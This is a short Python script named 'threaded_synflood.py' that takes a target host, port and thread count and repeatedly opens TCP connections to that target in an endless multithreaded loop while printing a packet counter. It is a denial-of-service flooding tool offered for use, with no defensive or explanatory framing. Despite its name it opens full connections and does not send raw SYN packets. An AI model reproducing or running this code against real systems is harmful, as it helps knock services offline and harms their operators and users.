#!/usr/bin/python

# threaded_synflood.py

import random
import socket
import sys
import threading


class synflood(threading.Thread):
    global trgt, prt
    def __init__(self):
        threading.Thread.__init__(self)


    def run(self):
        s = socket.socket()
        s.connect((trgt, prt))


if __name__ == "__main__":

    if len(sys.argv) != 4:
        print("threading_synfld.py <target> <port> <threads>")
        sys.exit(1)


    trgt = sys.argv[1]
    prt = int(sys.argv[2])
    threads = int(sys.argv[3])
    count = 0

    print("**> flooding %s:%i with syn pkts" % (trgt, prt))

    while True:
        try:

            if threading.activeCount() < threads:
                synflood().start()
                count += 1
                sys.stdout.write("\r   pkts: %i" % count)

        except KeyboardInterrupt:
            sys.exit(1)





